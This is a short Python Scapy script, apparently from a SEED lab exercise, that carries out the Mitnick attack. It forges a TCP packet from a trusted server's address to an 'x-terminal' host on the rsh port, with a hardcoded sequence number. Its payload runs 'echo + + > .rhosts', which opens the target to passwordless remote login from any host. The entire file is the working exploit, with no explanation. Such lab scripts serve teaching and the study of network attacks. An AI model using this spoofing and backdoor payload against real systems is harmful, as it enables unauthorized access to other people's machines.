from scapy.all import *

trusted_server = "10.9.0.6"  # server ip
trusted_port = 9090          # server port
victim = "10.9.0.5"          # x-terminal ip
victim_port = 514            # x-terminal port

IPLayer = IP(src=trusted_server, dst=victim)
TCPLayer = TCP(sport=trusted_port, dport=victim_port, flags="SA", seq=4048017697)

data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'

pkt = IPLayer/TCPLayer/data
ls(pkt)
send(pkt, verbose=0)
